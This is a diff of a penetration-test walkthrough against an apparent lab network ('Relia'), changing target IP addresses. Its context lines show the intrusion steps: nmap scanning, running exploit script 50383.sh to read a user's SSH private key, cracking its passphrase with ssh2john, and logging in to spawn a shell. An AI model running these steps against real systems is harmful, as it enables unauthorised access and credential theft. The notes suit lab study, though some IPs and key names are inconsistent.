@@ -2,12 +2,12 @@
 We are tasked with a penetration test of Relia, an industrial company building driving systems for the timber industry. The target got attacked a few weeks ago and wants now to get an assessment of their IT security. Their goal is to determine if an attacker can breach the perimeter and get access to the domain controller in the internal network.
 
 # Scan the DMZ network
-sudo nmap -sC -sV -T4 192.168.243.245-250 192.168.243.189,191
+sudo nmap -sC -sV -T4 192.168.197.245-250 192.168.197.189,191
 [port-scanning.md]
 
 # Found some interesting port from .245 where it have 2222 running and 21
-ssh root@192.168.243.245 -p 2222  
-root@192.168.243.245: Permission denied (publickey).
+ssh root@192.168.197.245 -p 2222  
+root@192.168.197.245: Permission denied (publickey).
 # It required public key, lets try to access FTP port with anonymous user
 ftp -p 203.0.113.0
 # When prompted for a username, you can enter either “ftp” or “anonymous”. Both are same
@@ -35,7 +35,7 @@ id_xmss：XMSS私钥文件（使用Hash-based签名算法）。
 sudo bash 50383.sh targets.txt /home/anita/.ssh/id_ecdsa
 
 # Then we found the privatekey require passphrase
-ssh -i id_edcsa anita@192.168.243.245 -p 2222
+ssh -i id_edcsa anita@192.168.197.245 -p 2222
 Enter passphrase for key 'id_edcsa': 
 
 # Use ssh2john to extract the hash
@@ -106,7 +106,7 @@ $6$p6n32TS.3/wDw7ax$TNwiUYnzlmx7Q0w59MbhSRjqW37W20OpGs/fCRJ3XiffbBVQuZTwtGeI
 
 # DEMO
 # Use the same SSH methods like WEB01 on the DEMO
-ssh -i id_edcsa anita@192.168.243.246 -p 2222
+ssh -i id_edcsa anita@192.168.197.246 -p 2222
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 anita@demo:/tmp$ hostname
 demo
